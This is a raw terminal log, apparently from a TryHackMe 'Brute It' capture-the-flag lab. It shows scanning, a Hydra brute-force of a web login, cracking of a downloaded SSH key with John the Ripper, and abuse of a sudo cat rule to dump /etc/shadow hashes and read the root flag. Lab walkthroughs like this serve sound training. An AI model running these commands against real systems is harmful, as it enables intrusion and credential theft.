@@ -1,0 +1,518 @@
+~/THM/bruteit> nmap -sV -sC 10.48.157.166      
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 16:55 IST
+Nmap scan report for 10.48.157.166
+Host is up (0.19s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
+|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
+|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 79.98 seconds
+~/THM/bruteit> 
+~/THM/bruteit> nmap -sV -sC -oA nmap.txt 10.48.157.166                    
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 16:57 IST
+
+~/THM/bruteit> nmap -sV -sC -oA nmap.txt 10.48.157.166 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 16:57 IST
+Nmap scan report for 10.48.157.166
+Host is up (0.18s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
+|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
+|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 78.40 seconds
+~/THM/bruteit> ls
+nmap.txt.gnmap  nmap.txt.nmap  nmap.txt.xml
+~/THM/bruteit> ping 10.48.157.166      
+PING 10.48.157.166 (10.48.157.166) 56(84) bytes of data.
+64 bytes from 10.48.157.166: icmp_seq=1 ttl=62 time=54.9 ms
+^C
+--- 10.48.157.166 ping statistics ---
+2 packets transmitted, 1 received, 50% packet loss, time 1002ms
+rtt min/avg/max/mdev = 54.870/54.870/54.870/0.000 ms
+~/THM/bruteit> wget http://10.10.54.46/admin/panel/id_rsa
+--2025-11-01 17:22:33--  http://10.10.54.46/admin/panel/id_rsa
+Connecting to 10.10.54.46:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1766 (1.7K)
+Saving to: ‘id_rsa’
+
+id_rsa                       100%[=============================================>]   1.72K  --.-KB/s    in 0s      
+
+2025-11-01 17:22:35 (54.0 MB/s) - ‘id_rsa’ saved [1766/1766]
+
+~/THM/bruteit> /usr/share/john                              
+/usr/share/john> ls
+1password2john.py      dumb16.conf                    ldif2john.pl              pse2john.py
+7z2john.pl             dumb32.conf                    leet.pl                   ps_token2john.py
+adxcsouf2john.py       dynamic.conf                   lib                       pwsafe2john.py
+aem2john.py            dynamic_disabled.conf          libreoffice2john.py       __pycache__
+aix2john.pl            dynamic_flat_sse_formats.conf  lion2john-alt.pl          radius2john.pl
+aix2john.py            ecryptfs2john.py               lion2john.pl              radius2john.py
+alnum.chr              ejabberd2john.py               lm_ascii.chr              regex_alphabets.conf
+alnumspace.chr         electrum2john.py               lotus2john.py             repeats16.conf
+alpha.chr              encfs2john.py                  lower.chr                 repeats32.conf
+andotp2john.py         enpass2john.py                 lowernum.chr              restic2john.py
+androidbackup2john.py  enpass5tojohn.py               lowerspace.chr            rexgen2rules.pl
+androidfde2john.py     ethereum2john.py               luks2john.py              rules
+ansible2john.py        filezilla2john.py              mac2john-alt.py           rulestack.pl
+apex2john.py           fuzz.dic                       mac2john.py               sap2john.pl
+applenotes2john.py     fuzz_option.pl                 mcafee_epo2john.py        sense2john.py
+aruba2john.py          geli2john.py                   monero2john.py            sha-dump.pl
+ascii.chr              genincstats.rb                 money2john.py             sha-test.pl
+atmail2john.pl         hccapx2john.py                 mosquitto2john.py         signal2john.py
+axcrypt2john.py        hextoraw.pl                    mozilla2john.py           sipdump2john.py
+bestcrypt2john.py      htdigest2john.py               multibit2john.py          ssh2john.py
+bestcryptve2john.py    hybrid.conf                    neo2john.py               sspr2john.py
+bitcoin2john.py        ibmiscanner2john.py            netntlm.pl                staroffice2john.py
+bitshares2john.py      ikescan2john.py                netscreen.py              stats
+bitwarden2john.py      ios7tojohn.pl                  office2john.py            strip2john.py
+bks2john.py            itunes_backup2john.pl          openbsd_softraid2john.py  telegram2john.py
+blockchain2john.py     iwork2john.py                  openssl2john.py           test_tezos2john.py
+ccache2john.py         john.conf                      padlock2john.py           tezos2john.py
+cisco2john.pl          kdcdump2john.py                pass_gen.pl               truecrypt2john.py
+codepage.pl            keychain2john.py               password.lst              unisubst.conf
+cracf2john.py          keyring2john.py                pcap2john.py              unrule.pl
+cronjob                keystore2john.py               pdf2john.pl               upper.chr
+dashlane2john.py       kirbi2john.py                  pem2john.py               uppernum.chr
+deepsound2john.py      known_hosts2john.py            pfx2john.py               utf8.chr
+dictionary.rfc2865     korelogic.conf                 pgpdisk2john.py           vdi2john.pl
+digits.chr             krb2john.py                    pgpsda2john.py            vmx2john.py
+diskcryptor2john.py    kwallet2john.py                pgpwde2john.py            zed2john.py
+dmg2john.py            lanman.chr                     pkcs12kdf.py              ztex
+dns                    lastpass2john.py               potcheck.pl
+DPAPImk2john.py        latin1.chr                     prosody2john.py
+/usr/share/john> r  
+r                            reindexdb                    rpc.idmapd                 
+r2                           remotinator                  rpcinfo                    
+r2agent                      remove-default-ispell        rpc.statd                  
+r2pm                         remove-default-wordlist      rpc.svcgssd                
+r2r                          remove-shell                 rpm                        
+rabin2                       rename.ul                    rpm2archive                
+racc                         rendercheck                  rpm2cpio                   
+racc3.3                      renice                       rpmbuild                   
+racf2john                    reordercap                   rpmdb                      
+radare2                      repc                         rpmgraph                   
+radiff2                      repeat                       rpmkeys                    
+radius2john                  replace                      rpmlua                     
+rafind2                      replay                       r-pmpost                   
+ragg2                        request-key                  rpmquery                   
+rahash2                      reset                        rpmsign                    
+rake                         reset_color                  rpmsort                    
+rake3.3                      resize                       rpmspec                    
+randpkt                      resize2fs                    rpmverify                  
+ranlib                       resizecons                   rq                         
+rar2john                     resizepart                   rqinfo                     
+rarp                         resolveip                    rqworker                   
+rarun2                       resolve_stack_dump           rrsync                     
+rasign2                      responder                    rsh                        
+rasm2                        responder-BrowserListener    rsh-redone-rlogin          
+rasttopnm                    responder-DHCP_Auto          rsh-redone-rsh             
+ravc2                        responder-FindSQLSrv         rsmangler                  
+raw2dyna                     responder-Icmp-Redirect      rst2html                   
+rawshark                     responder-MultiRelay         rst2html4                  
+rawtopgm                     responder-RunFinger          rst2html5                  
+rawtoppm                     restfulHarvest               rst2latex                  
+rax2                         restic2john                  rst2man                    
+rb                           restorecon                   rst2odt                    
+rbash                        restorecon_xattr             rst2pseudoxml              
+rbs3.3                       return                       rst2s5                     
+rcc                          rev                          rst2xetex                  
+rctest                       revpath                      rst2xml                    
+rdbg                         rfcomm                       rstart                     
+rdbg3.3                      rfddump                      rstartd                    
+rdesktop                     rfdformat                    rst-buildhtml              
+rdjpgcom                     rfkill                       rstpep2html                
+rdma                         rgb3toppm                    rsync                      
+rdoc                         rgrep                        rsync-ssl                  
+rdoc3.3                      ri                           rtacct                     
+read                         ri3.3                        rtcwake                    
+readelf                      ristretto                    rtkitctl                   
+readlink                     rlatopam                     rtmon                      
+readonly                     rletopnm                     rtstat                     
+readprofile                  rlogin                       ruby                       
+realpath                     rlogin-cwd                   ruby3.3                    
+rearj                        rm                           rules/                     
+reaver                       rmdir                        run0                       
+reboot                       rmid                         runcon                     
+recon-cli                    rmiregistry                  rungs                      
+recon-ng                     rmmod                        run-help                   
+recon-web                    rmodtool                     run-mailcap                
+recordmydesktop              r-mpost                      run-parts                  
+recv_image                   rmt                          runscript                  
+redis-benchmark              rmt-tar                      runuser                    
+redis-check-aof              rnano                        run-with-aspell            
+redis-check-rdb              rotatelogs                   runxlrd                    
+redis-cli                    route                        r-upmpost                  
+redis-server                 routel                       rview                      
+redsocks                     rpcbind                      rvim                       
+reduce-chunk-list-19         rpcclient                    rwinrm                     
+reged                        rpcctl                       rwinrmcp                   
+regexp-assemble              rpcdebug                     rx                         
+register-python-argcomplete  rpcgen                       rz                         
+rehash                       rpc.gssd                     rzsh                       
+/usr/share/john> cd ~/THM/bruteit   
+~/THM/bruteit> /usr/share/john/ssh2john.py id_rsa > rsa.txt     
+~/THM/bruteit> john rsa.txt -w /usr/share/wordlists/rockyou.txt             
+Warning: only loading hashes of type "SSH", but also saw type "tripcode"
+Use the "--format=tripcode" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "descrypt"
+Use the "--format=descrypt" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "pix-md5"
+Use the "--format=pix-md5" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "mysql"
+Use the "--format=mysql" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "oracle"
+Use the "--format=oracle" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1"
+Use the "--format=Raw-SHA1" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "LM"
+Use the "--format=LM" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1-AxCrypt"
+Use the "--format=Raw-SHA1-AxCrypt" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "bfegg"
+Use the "--format=bfegg" option to force loading hashes of that type instead
+Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
+Warning: only loading hashes of type "SSH", but also saw type "dynamic=md5($p)"
+Use the "--format=dynamic=md5($p)" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "cryptoSafe"
+Use the "--format=cryptoSafe" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "HAVAL-128-4"
+Use the "--format=HAVAL-128-4" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA256"
+Use the "--format=Raw-SHA256" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA512"
+Use the "--format=HMAC-SHA512" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Tiger"
+Use the "--format=Tiger" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "lotus5"
+Use the "--format=lotus5" option to force loading hashes of that type instead
+Session aborted
+~/THM/bruteit> john rsa.txt --wordlist /usr/share/wordlists/rockyou.txt
+Warning: only loading hashes of type "SSH", but also saw type "tripcode"
+Use the "--format=tripcode" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "descrypt"
+Use the "--format=descrypt" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "pix-md5"
+Use the "--format=pix-md5" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "mysql"
+Use the "--format=mysql" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "oracle"
+Use the "--format=oracle" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1"
+Use the "--format=Raw-SHA1" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "LM"
+Use the "--format=LM" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1-AxCrypt"
+Use the "--format=Raw-SHA1-AxCrypt" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "bfegg"
+Use the "--format=bfegg" option to force loading hashes of that type instead
+Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
+Warning: only loading hashes of type "SSH", but also saw type "dynamic=md5($p)"
+Use the "--format=dynamic=md5($p)" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "cryptoSafe"
+Use the "--format=cryptoSafe" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "HAVAL-128-4"
+Use the "--format=HAVAL-128-4" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA256"
+Use the "--format=Raw-SHA256" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA512"
+Use the "--format=HMAC-SHA512" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Tiger"
+Use the "--format=Tiger" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "lotus5"
+Use the "--format=lotus5" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA224"
+Use the "--format=HMAC-SHA224" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "MD2"
+Use the "--format=MD2" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1-Linkedin"
+Use the "--format=Raw-SHA1-Linkedin" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "mdc2"
+Use the "--format=mdc2" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "mscash"
+Use the "--format=mscash" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "mscash2"
+Use the "--format=mscash2" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA224"
+Use the "--format=Raw-SHA224" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Palshop"
+Use the "--format=Palshop" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "NT"
+Use the "--format=NT" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "ripemd-160"
+Use the "--format=ripemd-160" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Raw-MD4"
+Use the "--format=Raw-MD4" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Raw-MD5"
+Use the "--format=Raw-MD5" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "hMailServer"
+Use the "--format=hMailServer" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Raw-MD5u"
+Use the "--format=Raw-MD5u" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "ripemd-128"
+Use the "--format=ripemd-128" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "gost"
+Use the "--format=gost" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "Snefru-128"
+Use the "--format=Snefru-128" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "ZipMonster"
+Use the "--format=ZipMonster" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA384"
+Use the "--format=HMAC-SHA384" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "oracle11"
+Use the "--format=oracle11" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "xsha"
+Use the "--format=xsha" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "lotus85"
+Use the "--format=lotus85" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "HAVAL-256-3"
+Use the "--format=HAVAL-256-3" option to force loading hashes of that type instead
+Warning: only loading hashes of type "SSH", but also saw type "plaintext"
+Use the "--format=plaintext" option to force loading hashes of that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with wordlist:/usr/share/john/password.lst
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2025-11-01 17:26) 0g/s 88650p/s 88650c/s 88650C/s 1701d..sss
+Session completed. 
+~/THM/bruteit> /usr/share/john/ssh2john.py id_rsa > rsa.hash           
+~/THM/bruteit> cat rsa.        
+cat: rsa.: No such file or directory
+~/THM/bruteit> cat rsa.hash             
+id_rsa:$sshng$1$16$E32C44CDC29375458A02E94F94B280EA$1200$2423ec7a7b726dd092c7c40c39c58a9c802c9c84444e3663cfa00b2645f79ca488e2de34cbc59f59f901883aafc4b22652b16edfefd40a65f071e5bab89ed9e42a6a305a5440df28194c5c98e74f03cf1ba44066507fef0f62bf67e2a0d2f63406f6d3cf75447295c9ca0b68f56460dccf57495b26b31a5a0049785c137c12694a02447e14b8f6d6a6f33f337c63b6ca1d84342f8de322e94d28e12af636c8f0ed5ce58530a30b5594f04d4a5cd132e12171e2756d80d6c94424df3a552da5f2f99de666d32ae4d9008e2765a25d59b70331bf00f2e3bf038f135067b791fdca109aada38f7b4178a1fd0173999434305077e61260705c734af364e9ff6796fd293ca6c2e7804b2f0153cb7b1792e5002bb3ec063d9a7572957589273702754154ec5a078bb3cd35d48cfd87f19ebc6b7e01f2d31d7a3d0c2c70b5294716aa0ca2fcc76aea5f077a89413146dc173a80bdb566f3ee838593ef738174d1bce50ef5b6ddbda923846b688f1f9c45c7b72eab7e426e1cd551f8df1975a61904e0ddfe7d1ad1f4d0d4ddfad4a146af9105ecb5f8a8a273d9c3f69bbab148f9ad64083319abd4475243bc25f3ca36cf79c591cb472e0a6a7c042f8f778b37cb76fab6a36e85aac97d9499e81d1e37df7ddba2799deec6d419b23ef3e3ef06f92ae5b5c8a1a7df60cbfc19fe6b8a117969e01cc2c3a3fe319b1789ae99ada2fc2624e5e8e68f94784537cb0afeb140497375bca1439735f4308dd357324815b297fcc3b6c679cb9c15d988d2c0e2606364e6ebe6c148ee91f54b4fd24f30df213a7b3ba27c3ef47f8560551b11e58ebbb429a86453658a0a26b5d2af3208dd8166c44f6edd41cb3aaa83508b078c771c9a7ab1cd10d27e406403a22d22ac79e7e704d1fd2c7687d7b6fcef0915816b9185681b4d26117de342f1f717db770384673043c1866f16fddcd5578f4d3d30bd6c9bbe8d2a2537dab81d7244633597ba1c076c221e06414f13d50e36f8a9f553f0534f7f5ec3cff0634435082a832eee04e27e99c1fa2c38e3d716db2e77f14f8e98ea891399b2abe53422463dcb27600c1eaeb86adf900629e8d0ef3c5ef53e088085caf38201ae0eada38b3a1e1f53aaf72bede299f743c77c12fb82b37db8eb89793bedb0f93d807a23e5ef8fb1ce48466b511c3c96afa63a208a8d04e550046af87a61e6bfae21ce1de32241d42533eb4d0ba60ead50c4522703199195a1144e6768036e387ac4465ec6a29cf439adf496c97d8a1b046ef4d950bb129c621c678998967f7035c50e12759419e417caa199342dce21281320770fcca252f5bcc516991a53909d95a2932286b49448ac666f39c0fa04a412cd8a28dfabcd3cae14ed00152d1c8d0c7c9e613a3c2f336cc746836eed6b502fbcdc3c89c1423138299de963c28fcd29fe69e78dc178db0c20395b5776e7a44015d9e4aa70be65e36feca8c8f0a025b895c3052d9a065c50df01cd0f281703d74eccd4620363839445823fcc0584eb68be9560301ea67e18a3075a025bf733c20244a43719b40457a6429a20ca00cc772b7549a6c638695e766aee71e37768e9edf1c93491ec4d9b7ec51b9738f66fe9995eb9b1b2df970d4eaec756bd4eb96e9d37092592562ab31310be0b4563f0474b6c6f6e6d3ae52be833ff1ebe7630b68b835c88191f35711f96
+~/THM/bruteit> john rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+rockinroll       (id_rsa)     
+1g 0:00:00:00 DONE (2025-11-01 17:28) 11.11g/s 806755p/s 806755c/s 806755C/s rubicon..rock14
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+~/THM/bruteit> ssh john@10.10.54.46 -i id_rsa             
+The authenticity of host '10.10.54.46 (10.10.54.46)' can't be established.
+ED25519 key fingerprint is SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.54.46' (ED25519) to the list of known hosts.
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa": bad permissions
+john@10.10.54.46's password: 
+Permission denied, please try again.
+john@10.10.54.46's password: 
+
+~/THM/bruteit> ssh -i id_rsa john@10.10.54.46        
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa": bad permissions
+john@10.10.54.46's password: 
+
+~/THM/bruteit> 
+~/THM/bruteit> chmod 600 id_rsa             
+~/THM/bruteit> ssh -i id_rsa john@10.10.54.46
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Nov  1 12:00:47 UTC 2025
+
+  System load:  0.08               Processes:           108
+  Usage of /:   25.7% of 19.56GB   Users logged in:     0
+  Memory usage: 42%                IP address for ens5: 10.10.54.46
+  Swap usage:   0%
+
+
+63 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
+john@bruteit:~$ ls
+user.txt
+john@bruteit:~$ cat user.txt 
+THM{a_password_is_not_a_barrier}
+john@bruteit:~$ sudo -l
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+john@bruteit:~$ LFILE=/etc/shadow
+john@bruteit:~$ sudo cat /etc/shadow
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+bin:*:18295:0:99999:7:::
+sys:*:18295:0:99999:7:::
+sync:*:18295:0:99999:7:::
+games:*:18295:0:99999:7:::
+man:*:18295:0:99999:7:::
+lp:*:18295:0:99999:7:::
+mail:*:18295:0:99999:7:::
+news:*:18295:0:99999:7:::
+uucp:*:18295:0:99999:7:::
+proxy:*:18295:0:99999:7:::
+www-data:*:18295:0:99999:7:::
+backup:*:18295:0:99999:7:::
+list:*:18295:0:99999:7:::
+irc:*:18295:0:99999:7:::
+gnats:*:18295:0:99999:7:::
+nobody:*:18295:0:99999:7:::
+systemd-network:*:18295:0:99999:7:::
+systemd-resolve:*:18295:0:99999:7:::
+syslog:*:18295:0:99999:7:::
+messagebus:*:18295:0:99999:7:::
+_apt:*:18295:0:99999:7:::
+lxd:*:18295:0:99999:7:::
+uuidd:*:18295:0:99999:7:::
+dnsmasq:*:18295:0:99999:7:::
+landscape:*:18295:0:99999:7:::
+pollinate:*:18295:0:99999:7:::
+thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
+sshd:*:18489:0:99999:7:::
+john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
+john@bruteit:~$ su root
+Password: 
+su: Authentication failure
+john@bruteit:~$ cat /root/root.txt
+cat: /root/root.txt: Permission denied
+john@bruteit:~$ sudo cat /root/root.txtx
+cat: /root/root.txtx: No such file or directory
+john@bruteit:~$ sudo cat /root/root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
+john@bruteit:~$ ~/THM/bruteit> gobuster dir -u 10.48.157.166 -w /usr/share/wordlists/dirb/common.txt               
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.157.166
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 0 / 1 (0.00%)
+2025/11/01 16:59:25 error on running gobuster on http://10.48.157.166/: timeout occurred during the request
+~/THM/bruteit> gobuster dir -u 10.48.157.166 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.157.166
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 0 / 1 (0.00%)
+2025/11/01 17:00:14 error on running gobuster on http://10.48.157.166/: timeout occurred during the request
+~/THM/bruteit> gobuster dir -u http://10.48.157.166 -w /usr/share/wordlists/dirb/common.txt                 
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.157.166
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 0 / 1 (0.00%)
+2025/11/01 17:00:41 error on running gobuster on http://10.48.157.166/: timeout occurred during the request
+~/THM/bruteit> gobuster dir -u http://10.10.54.46 -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.54.46
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 276]
+/.htpasswd            (Status: 403) [Size: 276]
+/.htaccess            (Status: 403) [Size: 276]
+/admin                (Status: 301) [Size: 310] [--> http://10.10.54.46/admin/]
+/index.html           (Status: 200) [Size: 10918]
+/server-status        (Status: 403) [Size: 276]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+~/THM/bruteit> gobuster dir -u http://10.10.54.46 -w /usr/share/wordlists/dirb/common.txt > gobuster.txt  
+~/THM/bruteit> hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.54.46 http-post-form "/admin/:user=^USER^&pass=^PASS^&Login=Login:Username or password invalid"
+  
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-01 17:17:58
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://10.10.54.46:80/admin/:user=^USER^&pass=^PASS^&Login=Login:Username or password invalid
+[80][http-post-form] host: 10.10.54.46   login: admin   password: xavier
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-01 17:18:33
+~/THM/bruteit> nano hashes      
